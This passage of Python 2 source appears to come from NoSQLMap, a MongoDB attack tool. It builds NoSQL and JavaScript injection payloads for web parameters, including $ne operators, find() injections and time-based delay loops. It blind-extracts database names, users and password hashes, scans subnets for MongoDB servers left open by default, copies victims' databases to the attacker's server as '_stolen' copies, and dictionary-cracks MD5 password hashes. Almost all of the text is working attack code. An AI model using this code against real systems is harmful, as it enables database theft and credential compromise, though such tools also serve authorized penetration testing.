			print "Starting Javascript string escape time based injection..."
			start = time.time()
			strTimeInj = urllib.urlopen(uriArray[6])
			page = strTimeInj.read()
			end = time.time()
			strTimeInj.close()
			#print str(end)
			#print str(start)
			strTimeDelta = (int(round((end - start), 3)) - timeBase)
			#print str(strTimeDelta)
			if strTimeDelta > 25:
				print "HTTP load time variance was " + str(strTimeDelta) +" seconds! Injection possible."
				strTbAttack = True
			
			else:
				print "HTTP load time variance was only " + str(strTimeDelta) + ".  Injection probably didn't work."
				strTbAttack = False
			
			print "Starting Javascript integer escape time based injection..."
			start = time.time()
			intTimeInj = urllib.urlopen(uriArray[7])
			page = intTimeInj.read()
			end = time.time()
			intTimeInj.close()
			#print str(end)
			#print str(start)
			intTimeDelta = (int(round((end - start), 3)) - timeBase)
			#print str(strTimeDelta)
			if intTimeDelta > 25:
				print "HTTP load time variance was " + str(intTimeDelta) +" seconds! Injection possible."
				intTbAttack = True
			
			else:
				print "HTTP load time variance was only " + str(intTimeDelta) + "seconds.  Injection probably didn't work."
				intTbAttack = False
		
		if lt24 == True:
			bfInfo = raw_input("MongoDB < 2.4 detected.  Start brute forcing database info (y/n)? ")
			
			if bfInfo == "y" or bfInfo == "Y":
				getDBInfo()
				
		
		print "\n"	
		print "Vunerable URLs:"
		print "\n".join(vulnAddrs)
		print "\n"
		print "Possibly vulnerable URLs:"
		print"\n".join(possAddrs)
		print "\n"
		print "Timing based attacks:"
		
		if strTbAttack == True:
			print "String attack-Successful"
		else:
			print "String attack-Unsuccessful"
		if intTbAttack == True:
			print "Integer attack-Successful"
		else:
			print "Integer attack-Unsuccessful"
		
		fileOut = raw_input("Save results to file (y/n)? ")
		
		if fileOut == "y" or fileOut == "Y":
			savePath = raw_input("Enter output file name: ")
			fo = open(savePath, "wb")
			fo.write ("Vulnerable URLs:\n")
			fo.write("\n".join(vulnAddrs))
			fo.write("\n\n")
			fo.write("Possibly Vulnerable URLs:\n")
			fo.write("\n".join(possAddrs))
			fo.write("\n")
			fo.write("Timing based attacks:\n")
			
			if strTbAttack == True:
				fo.write("String Attack-Successful\n")
			else:
				fo.write("String Attack-Unsuccessful\n")
			fo.write("\n")
			
			if intTbAttack == True:
				fo.write("Integer attack-Successful\n")
			else:
				fo.write("Integer attack-Unsuccessful\n")
			fo.write("\n")
			fo.close()
		
	raw_input("Press enter to continue...")
	return()

def webDBAttacks(trueLen):
	nameLen = 0
	injTestLen = 0
	getDBName = raw_input("Get database name (y/n)? ")
	
	if getDBName == "y" or getDBName == "Y":
		while injTestLen != trueLen:
			testUri = uriArray[16].split("---")
			
	

def randInjString(size):
	print "What format should the random string take?"
	print "1-Alphanumeric"
	print "2-Letters only"
	print "3-Numbers only"
	print "4-Email address"
	format = True
	
	while format:
		format = raw_input("Select an option: ")
	
		if format == "1":
			chars = string.ascii_letters + string.digits
			return ''.join(random.choice(chars) for x in range(size))
	
		elif format == "2":
			chars = string.ascii_letters
			return ''.join(random.choice(chars) for x in range(size))
	
		elif format == "3":
			chars = string.digits
			return ''.join(random.choice(chars) for x in range(size))
	
		elif format == "4":
			chars = string.ascii_letters + string.digits
			return ''.join(random.choice(chars) for x in range(size)) + '@' + ''.join(random.choice(chars) for x in range(size)) + '.com'
		
		else:
			format = True
			print "Invalid selection."
	

def buildUri(origUri, randValue):
	paramName = []
	paramValue = []
	global uriArray
	uriArray = ["","","","","","","","","","","","","","","","","",""]
	injOpt = ""
	
	#Split the string between the path and parameters, and then split each parameter
	try:
		split_uri = origUri.split("?")
		params = split_uri[1].split("&")
	
	except:
		raw_input("Not able to parse the URL and parameters.  Check options settings.  Press enter to return to main menu...")
		mainMenu()
		
	for item in params:
		index = item.find("=")
		paramName.append(item[0:index])
		paramValue.append(item[index + 1:len(item)])
		
	menuItem = 1
	print "List of parameters:"
	for params in paramName:
		print str(menuItem) + "-" + params
		menuItem += 1
		
	
	
	try:
		injIndex = raw_input("Which parameter should we inject? ")
		injOpt = str(paramName[int(injIndex)-1])
		print "Injecting the " + injOpt + " parameter..."
	except:
		raw_input("Something went wrong.  Press enter to return to the main menu...")
		mainMenu()
	
	
	x = 0
	uriArray[0] = split_uri[0] + "?"
	uriArray[1] = split_uri[0] + "?"
	uriArray[2] = split_uri[0] + "?"
	uriArray[3] = split_uri[0] + "?"
	uriArray[4] = split_uri[0] + "?"
	uriArray[5] = split_uri[0] + "?"
	uriArray[6] = split_uri[0] + "?"
	uriArray[7] = split_uri[0] + "?"
	uriArray[8] = split_uri[0] + "?"
	uriArray[9] = split_uri[0] + "?"
	uriArray[10] = split_uri[0] + "?"
	uriArray[11] = split_uri[0] + "?"
	uriArray[12] = split_uri[0] + "?"
	uriArray[13] = split_uri[0] + "?"
	uriArray[14] = split_uri[0] + "?"
	uriArray[15] = split_uri[0] + "?"
	uriArray[16] = split_uri[0] + "?"
	uriArray[17] = split_uri[0] + "?"
	
	for item in paramName:		
		if paramName[x] == injOpt:
			uriArray[0] += paramName[x] + "=" + randValue + "&"
			uriArray[1] += paramName[x] + "[$ne]=" + randValue + "&"
			uriArray[2] += paramName[x] + "=a'; return db.a.find(); var dummy='!" + "&"
			uriArray[3] += paramName[x] + "=1; return db.a.find(); var dummy=1" + "&"
			uriArray[4] += paramName[x] + "=a'; return db.a.findOne(); var dummy='!" + "&"
			uriArray[5] += paramName[x] + "=a; return db.a.findOne(); var dummy=1" + "&"
			uriArray[6] += paramName[x] + "=a'; var date = new Date(); var curDate = null; do { curDate = new Date(); } while((Math.abs(date.getTime()-curDate.getTime()))/1000 < 10); return; var dummy='!" + "&"
			uriArray[7] += paramName[x] + "=1; var date = new Date(); var curDate = null; do { curDate = new Date(); } while((Math.abs(date.getTime()-curDate.getTime()))/1000 < 10); return; var dummy=1" + "&"
			uriArray[8] += paramName[x] + "=a'; return this.a != '" + randValue + "'; var dummy='!" + "&"
			uriArray[9] += paramName[x] + "=1; return this.a !=" + randValue + "; var dummy=1" + "&"
			uriArray[10] += paramName[x] + "=a\"; return db.a.find(); var dummy=\"!" + "&"
			uriArray[11] += paramName[x] + "=a\"; return this.a != '" + randValue + "'; var dummy=\"!" + "&"
			uriArray[12] += paramName[x] + "=a\"; return db.a.findOne(); var dummy=\"!" + "&"
			uriArray[13] += paramName[x] + "=a\"; var date = new Date(); var curDate = null; do { curDate = new Date(); } while((Math.abs(date.getTime()-curDate.getTime()))/1000 < 10); return; var dummy=\"!" + "&"
			uriArray[14] += paramName[x] + "a'; return true; var dum=a'"
			uriArray[15] += paramName[x] + "1; return true; var dum=2"
			#Add values that can be manipulated for database attacks
			uriArray[16] += paramName[x] + "=a\'; ---"
			uriArray[17] += paramName[x] + "=1; if ---"

		else:
			uriArray[0] += paramName[x] + "=" + paramValue[x] + "&"
			uriArray[1] += paramName[x] + "=" + paramValue[x] + "&"
			uriArray[2] += paramName[x] + "=" + paramValue[x] + "&"
			uriArray[3] += paramName[x] + "=" + paramValue[x] + "&"
			uriArray[4] += paramName[x] + "=" + paramValue[x] + "&"
			uriArray[5] += paramName[x] + "=" + paramValue[x] + "&"
			uriArray[6] += paramName[x] + "=" + paramValue[x] + "&"
			uriArray[7] += paramName[x] + "=" + paramValue[x] + "&"
			uriArray[8] += paramName[x] + "=" + paramValue[x] + "&"
			uriArray[9] += paramName[x] + "=" + paramValue[x] + "&"
			uriArray[10] += paramName[x] + "=" + paramValue[x] + "&"
			uriArray[11] += paramName[x] + "=" + paramValue[x] + "&"
			uriArray[12] += paramName[x] + "=" + paramValue[x] + "&"
			uriArray[13] += paramName[x] + "=" + paramValue[x] + "&"
			uriArray[14] += paramName[x] + "=" + paramValue[x] + "&"
			uriArray[15] += paramName[x] + "=" + paramValue[x] + "&"
			uriArray[16] += paramName[x] + "=" + paramValue[x] + "&"
			uriArray[17] += paramName[x] + "=" + paramValue[x] + "&"
		x += 1
		
	#Clip the extra & off the end of the URL
	uriArray[0]= uriArray[0][:-1]
	uriArray[1] = uriArray[1][:-1]
	uriArray[2] = uriArray[2][:-1]
	uriArray[3] = uriArray[3][:-1]
	uriArray[4] = uriArray[4][:-1]
	uriArray[5] = uriArray[5][:-1]
	uriArray[6] = uriArray[6][:-1]
	uriArray[7] = uriArray[7][:-1]
	uriArray[8] = uriArray[8][:-1]
	uriArray[9] = uriArray[9][:-1]
	uriArray[10] = uriArray[10][:-1]
	uriArray[11] = uriArray[11][:-1]
	uriArray[12] = uriArray[12][:-1]
	uriArray[13] = uriArray[13][:-1]
	uriArray[14] = uriArray[14][:-1]
	uriArray[15] = uriArray[15][:-1]
	uriArray[16] = uriArray[16][:-1]
	uriArray[17] = uriArray[17][:-1]
	return uriArray[0]

def buildPostData(body):
	global bodyArray
	bodyArray = ["","","","","","","","","","","","","","","","","",""]
	injOpt = ""
	
	#Split the string between the path and parameters, and then split each parameter
		
		
	menuItem = 1
	print "List of parameters:"
	for params in body.keys():
		print str(menuItem) + "-" + params
		menuItem += 1
	
	try:
		injIndex = raw_input("Which parameter should we inject? ")
		injOpt = str(body.keys()[int(injIndex)-1])
		print "Injecting the " + injOpt + " parameter..."
	except:
		raw_input("Something went wrong.  Press enter to return to the main menu...")
		mainMenu()
	
	
	
def stealDBs(myDB):
	menuItem = 1	
	
	for dbName in dbList:
		print str(menuItem) + "-" + dbName
		menuItem += 1
	
	try:
		dbLoot = raw_input("Select a database to steal:")
	
	except:
		print "Invalid selection."
		stealDBs(myDB)
		
	try:
		#Mongo can only pull, not push, connect to my instance and pull from verified open remote instance.
		dbNeedCreds = raw_input("Does this database require credentials (y/n)? ")
		
		if dbNeedCreds == "n" or dbNeedCreds == "N":
			if optionSet[4] == False:
				raw_input("No IP specified to copy to! Press enter to return to main menu...")
				mainMenu()
			
			myDBConn = pymongo.MongoClient(myDB,27017)
			myDBConn.copy_database(dbList[int(dbLoot)-1],dbList[int(dbLoot)-1] + "_stolen",victim)	
		
		elif dbNeedCreds == "y" or dbNeedCreds == "Y":
			dbUser = raw_input("Enter database username: ")
			dbPass = raw_input("Enter database password: ")
			myDBConn.copy_database(dbList[int(dbLoot)-1],dbList[int(dbLoot)-1] + "_stolen",victim,dbUser,dbPass)
		
		else:
			raw_input("Invalid Selection.  Press enter to continue.")
			stealDBs(myDB)
			
		cloneAnother = raw_input("Database cloned.  Copy another (y/n)? ")
		
		if cloneAnother == "y" or cloneAnother == "Y":
			stealDBs(myDB)
		
		else:
			return()
	
	except:
		if str(sys.exc_info()).find('text search not enabled') != -1:
			raw_input("Database copied, but text indexing was not enabled on the target.  Indexes not moved.  Press enter to return...")
			mainMenu()
		else:	
			raw_input ("Something went wrong.  Are you sure your MongoDB is running and options are set? Press enter to return...")
			mainMenu()
	
def massMongo():
	global victim
	optCheck = True
	loadCheck = False
	success = []
	ipList = []
	print "\n"
	print "MongoDB Default Access Scanner"
	print "=============================="
	print "1-Scan a subnet for default MongoDB access"
	print "2-Loads IPs to scan from a file"
	print "x-Return to main menu"
	
	while optCheck:
		loadOpt = raw_input("Select a scan method: ")
		
	
		if loadOpt == "1":
			subnet = raw_input("Enter subnet to scan: ")
		
			try:
				for ip in ipcalc.Network(subnet):
					ipList.append(str(ip))
				optCheck = False
			except:
				raw_input("Not a valid subnet.  Press enter to return to main menu.")
				mainMenu()
				
	
		print "Debug:"
		print ipList
	
		if loadOpt == "2":
			while loadCheck == False:
				loadPath = raw_input("Enter file name with IP list to scan: ")

				try:
					with open (loadPath) as f:
					        ipList = f.readlines()
					loadCheck = True
					optCheck = False
				except:
					print "Couldn't open file."
					
		if loadOpt == "x":
			mainMenu()
			

	print "\n"
	for target in ipList:
	        try:
	                conn = pymongo.MongoClient(target,27017)
			print "Connected to " + target
			dbList = conn.database_names()
			
			print "Successful default access on " + target
			target = target[:-1]
			success.append(target)
			conn.disconnect()

		except:
		        print "Failed to connect to or need credentials for " + target 

	print "\n\n"
	print "Discovered MongoDB Servers:"
	
	menuItem = 1
	for server in success:
		print str(menuItem) + "-" + server
		menuItem += 1
	
	select = True
	print "\n"
	while select:
		select = raw_input("Select a NoSQLMap target or press x to exit: ")
	
		if select == "x" or select == "X":
			mainMenu()
	
		elif select.isdigit() == True:
			victim = success[int(select) - 1]
			optionSet[0] = True
			raw_input("New target set! Press enter to return to the main menu.")
			mainMenu()
	
		else:
			raw_input("Invalid selection.")				
	
def gen_pass(user, passw):
	return md5(user + ":mongo:" + str(passw)).hexdigest();


def brute_pass(user,key):
	loadCheck = False
	
	while loadCheck == False:
		dictionary = raw_input("Enter path to password dictionary: ")
		try:
			with open (dictionary) as f:
			       passList = f.readlines()
			loadCheck = True
		except:
			print " Couldn't load file."
	
	
	print "Running dictionary attack..."
	for passGuess in passList:
		temp = passGuess.split("\n")[0]
		
		if gen_pass(user, temp) == key:
			print "\nFound - "+user+":"+passGuess
			return passGuess
			
	print "Password not found for "+user
	return ""

def getDBInfo():
	curLen = 0
	nameLen = 0
	gotFullDb = False
	gotNameLen = False
	gotDbName = False
	gotColLen = False
	gotColName = False
	gotUserCnt = False
	finUser = False
	dbName = ""
	charCounter = 0
	nameCounter = 0
	usrCount = 0
	retrUsers = 0
	users = []
	hashes = []
	
	chars = string.ascii_letters + string.digits
	print "Getting baseline True query return size..."
	trueUri = uriArray[16].replace("---","return true; var dummy ='!" + "&")
	#print "Debug " + str(trueUri)
	baseLen = int(len(urllib.urlopen(trueUri).read()))
	print "Got baseline true query length of " + str(baseLen)
	
	
	print "Calculating DB name length..."
	
	while gotNameLen == False:
		calcUri = uriArray[16].replace("---","var curdb = db.getName(); if (curdb.length ==" + str(curLen) + ") {return true;} vardum='a" + "&")
		#print "Debug: " + calcUri
		lenUri = int(len(urllib.urlopen(calcUri).read()))
		#print "Debug length: " + str(lenUri)
		
		if lenUri == baseLen:
			print "Got database name length of " + str(curLen) + " characters."
			gotNameLen = True
		
		else:
			curLen += 1
	
	print "Database Name: ", 		
	while gotDbName == False:
		charUri = uriArray[16].replace("---","var curdb = db.getName(); if (curdb.charAt(" + str(nameCounter) + ") == '"+ chars[charCounter] + "') { return true; } vardum='a" + "&")
		#print "Debug: " + charUri
		
		lenUri = int(len(urllib.urlopen(charUri).read()))
		#print "debug: " + str(charCounter)
		#print "Debug length: " + str(lenUri)
		
		if lenUri == baseLen:
			dbName = dbName + chars[charCounter]
			print chars[charCounter],
			nameCounter += 1
			charCounter = 0
			
			if nameCounter == curLen:
				gotDbName = True
			
		
		else:
			charCounter += 1
	print "\n"
	
	getUserInf = raw_input("Get database users and password hashes (y/n)? ")
	
	if getUserInf == "y" or getUserInf == "Y":
		charCounter = 0
		nameCounter = 0
		#find the total number of users on the database
		while gotUserCnt == False:
			usrCntUri = uriArray[16].replace("---","var usrcnt = db.system.users.count(); if (usrcnt == " + str(usrCount) + ") { return true; } var dum='a")
			lenUri = int(len(urllib.urlopen(usrCntUri).read()))
		
			if lenUri == baseLen:
				print "Found " + str(usrCount) + " user(s)."
				gotUserCnt = True
			
			else:
				usrCount += 1
		
		usrChars = 0  #total number of characters in username
		charCounterUsr = 0 #position in the character array-Username
		rightCharsUsr = 0 #number of correct characters-Username
		rightCharsHash = 0 #number of correct characters-hash
		charCounterHash = 0 #position in the character array-hash
		username = ""
		pwdHash = ""
		charCountUsr = False
		query = "{}"
		
		while retrUsers < usrCount:
			if retrUsers == 0:
				while charCountUsr == False:
					#different query to get the first user vs. others
					usrUri = uriArray[16].replace("---","var usr = db.system.users.findOne(); if (usr.user.length == " + str(usrChars) + ") { return true; } var dum='a" + "&")
					lenUri = int(len(urllib.urlopen(usrUri).read()))
				
					if lenUri == baseLen:
						#Got the right number of characters
						charCountUsr = True
				
					else:
						usrChars += 1
					
				while  rightCharsUsr < usrChars:
					usrUri = uriArray[16].replace("---","var usr = db.system.users.findOne(); if (usr.user.charAt(" + str(rightCharsUsr) + ") == '"+ chars[charCounterUsr] + "') { return true; } var dum='a" + "&")
					lenUri = int(len(urllib.urlopen(usrUri).read()))
						
					if lenUri == baseLen:
						username = username + chars[charCounterUsr]
						#print username
						rightCharsUsr += 1
						charCounterUsr = 0				
				
					else:
						charCounterUsr += 1
				
				retrUsers += 1
				users.append(username)
				#reinitialize all variables and get ready to do it again
				#print str(retrUsers)
				#print str(users)
				charCountUsr = False
				rightCharsUsr = 0
				usrChars = 0
				username = ""
				
				while rightCharsHash < 32:  #Hash length is static
					hashUri = uriArray[16].replace("---","var usr = db.system.users.findOne(); if (usr.pwd.charAt(" + str(rightCharsHash) + ") == '"+ chars[charCounterHash] + "') { return true; } var dum='a" + "&")
					lenUri = int(len(urllib.urlopen(hashUri).read()))
						
					if lenUri == baseLen:
						pwdHash = pwdHash + chars[charCounterHash]
						#print pwdHash
						rightCharsHash += 1
						charCounterHash = 0
							
					else:
						charCounterHash += 1
						
				hashes.append(pwdHash)
				print "Got user:hash " + users[0] + ":" + hashes[0]
				#reinitialize all variables and get ready to do it again
				charCounterHash = 0
				rightCharsHash = 0
				pwdHash = ""
			else:
				while charCountUsr == False:
					#different query to get the first user vs. others
					usrUri = uriArray[16].replace("---","var usr = db.system.users.findOne({user:{$nin:" + str(users) + "}}); if (usr.user.length == " + str(usrChars) + ") { return true; } var dum='a" + "&")
					lenUri = int(len(urllib.urlopen(usrUri).read()))
				
					if lenUri == baseLen:
						#Got the right number of characters
						charCountUsr = True
				
					else:
						usrChars += 1
					
				while  rightCharsUsr < usrChars:
					usrUri = uriArray[16].replace("---","var usr = db.system.users.findOne({user:{$nin:" + str(users) + "}}); if (usr.user.charAt(" + str(rightCharsUsr) + ") == '"+ chars[charCounterUsr] + "') { return true; } var dum='a" + "&")	
					lenUri = int(len(urllib.urlopen(usrUri).read()))
						
					if lenUri == baseLen:
						username = username + chars[charCounterUsr]
						#print username
						rightCharsUsr += 1
						charCounterUsr = 0				
				
					else:
						charCounterUsr += 1
				
				retrUsers += 1
				#reinitialize all variables and get ready to do it again
				
				charCountUsr = False
				rightCharsUsr = 0
				usrChars = 0
				

				while rightCharsHash < 32:  #Hash length is static
					hashUri = uriArray[16].replace("---","var usr = db.system.users.findOne({user:{$nin:" + str(users) + "}}); if (usr.pwd.charAt(" + str(rightCharsHash) + ") == '"+ chars[charCounterHash] + "') { return true; } vardum='a" + "&")
					lenUri = int(len(urllib.urlopen(hashUri).read()))
						
					if lenUri == baseLen:
						pwdHash = pwdHash + chars[charCounterHash]
						#print pwdHash
						rightCharsHash += 1
						charCounterHash = 0
							
					else:
						charCounterHash += 1
						
				users.append(username)
				hashes.append(pwdHash)
				print "Got user:hash " + users[retrUsers-1] + ":" + hashes[retrUsers-1]
				#reinitialize all variables and get ready to do it again
				username = ""
				charCounterHash = 0
				rightCharsHash = 0
				pwdHash = ""
		
		
		
			
	raw_input("Press enter to continue...")

def signal_handler(signal, frame):
    print "\n"
    print "CTRL+C detected.  Exiting."
    sys.exit()
signal.signal(signal.SIGINT, signal_handler)
mainMenu()
